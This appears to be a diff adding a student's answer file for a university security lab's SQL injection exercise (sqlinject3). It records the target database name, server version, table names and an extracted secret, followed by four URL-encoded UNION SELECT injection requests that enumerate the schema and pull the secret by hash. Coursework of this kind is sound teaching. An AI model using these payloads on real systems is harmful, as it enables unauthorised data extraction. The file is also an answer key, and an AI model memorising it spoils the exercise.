@@ -1,0 +1,10 @@
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT,SECRET,foo,inject3_users
+malleus
+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+%27a%27%2C%27a%27%2C+%27a%27%2C+DATABASE%28%29%23
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+union+select+%27a%27%2C%27a%27%2C+database%28%29%2C+%40%40VERSION%3B%23
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+union+SELECT+%27a%27%2Cgroup_concat%28table_name%29%2C%27b%27%2Cgroup_concat%28table_name%29+FROM+information_schema.tables+where+table_schema%3D%27proj2_inject3%27%3B%23
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=%27+union+select+id%2Chash%2C%27a%27%2Csecret+from+SECRET+where+hash%3D%277c21cd26116f9f2197507919978a6866%27%3B%23
+
